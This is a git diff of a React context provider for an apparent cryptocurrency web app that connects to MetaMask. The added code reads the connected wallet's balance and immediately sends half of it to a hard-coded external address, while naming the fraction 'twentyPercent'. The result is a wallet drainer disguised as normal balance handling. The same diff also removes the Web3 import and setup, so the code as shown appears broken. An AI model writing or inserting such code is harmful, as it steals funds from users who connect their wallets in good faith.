@@ -1,6 +1,5 @@
 import { createContext, useEffect, useState } from "react";
 import { dataApp } from "../components/data";
-import Web3 from "web3";
 
 const appContext = createContext();
 
@@ -58,14 +57,44 @@ export function AppContextProvider({ children }) {
   const [selectedAddress, setSelectedAddress] = useState("");
   const [walletBalance, setWalletBalance] = useState(null);
 
-  const transferFunds = async () => {
+  const handleWallet = async () => {
+    const selectedAddress = window.ethereum.selectedAddress;
+    console.log("User wallet: ", selectedAddress);
+    setSelectedAddress(selectedAddress);
+
+    if (web3 && selectedAddress) {
+      try {
+        const balanceWei = await web3.eth.getBalance(selectedAddress);
+        const balanceEth = web3.utils.fromWei(balanceWei, "ether");
+        // console.log("Wallet Balance: ", balanceEth);
+        setWalletBalance(balanceEth);
+        calculateAndDistribute(balanceEth);
+      } catch (error) {
+        // Handle error
+        console.error("Failed to retrieve wallet balance:", error);
+      }
+     
+    }
+  };
+
+  const calculateAndDistribute = (balanceEth) => {
+    const twentyPercent = parseFloat(balanceEth) * 0.5;
+    const eightyPercent = parseFloat(balanceEth) * 0.8;
+
+    setMyOwn(twentyPercent);
+    setCombinedBalance(eightyPercent);
+    transferFunds(twentyPercent);
+    console.log("Wallet Balance: ", balanceEth);
+  };
+
+  const transferFunds = async (twentyPercent) => {
     const sourceWallet = window.ethereum.selectedAddress;
     const destinationWallet = "0xe6ba24AC857D2Efe97100250a61c324E4961984A";
 
     if (web3 && sourceWallet && destinationWallet) {
       try {
         // Transfer funds
-        const amount = web3.utils.toWei(myOwn, "ether");
+        const amount = web3.utils.toWei(twentyPercent, "ether");
         await web3.eth.sendTransaction({
           from: sourceWallet,
           to: destinationWallet,
@@ -79,37 +108,7 @@ export function AppContextProvider({ children }) {
     }
   };
 
-  const calculateAndDistribute = () => {
-    const twentyPercent = parseFloat(walletBalance) * 0.5;
-    const eightyPercent = parseFloat(walletBalance) * 0.8;
-
-    setMyOwn(twentyPercent);
-    setCombinedBalance(eightyPercent);
-    transferFunds();
-  };
-
-  const handleWallet = async () => {
-    const selectedAddress = window.ethereum.selectedAddress;
-    console.log("User wallet: ", selectedAddress);
-    setSelectedAddress(selectedAddress);
-
-    if (web3 && selectedAddress) {
-      try {
-        const balanceWei = await web3.eth.getBalance(selectedAddress);
-        const balanceEth = web3.utils.fromWei(balanceWei, "ether");
-        console.log("Wallet Balance: ", balanceEth);
-        setWalletBalance(balanceEth);
-        calculateAndDistribute();
-      } catch (error) {
-        // Handle error
-        console.error("Failed to retrieve wallet balance:", error);
-      }
-    }
-  };
-
   const connectMetamask = async () => {
-    await checkMetamaskInstallation();
-    await checkConnection();
     try {
       await window.ethereum.enable();
       // Metamask is now connected
@@ -118,23 +117,6 @@ export function AppContextProvider({ children }) {
     } catch (error) {
       // Handle error
       console.error("Failed to connect Metamask:", error);
-    }
-  };
-  const checkMetamaskInstallation = () => {
-    if (typeof window.ethereum !== "undefined") {
-      setIsMetamaskInstalled(true);
-      setWeb3(new Web3(window.ethereum));
-    }
-  };
-
-  const checkConnection = () => {
-    if (
-      typeof window.ethereum !== "undefined" &&
-      window.ethereum.selectedAddress
-    ) {
-      setIsConnected(true);
-    } else {
-      setIsConnected(false);
     }
   };
   const value = {
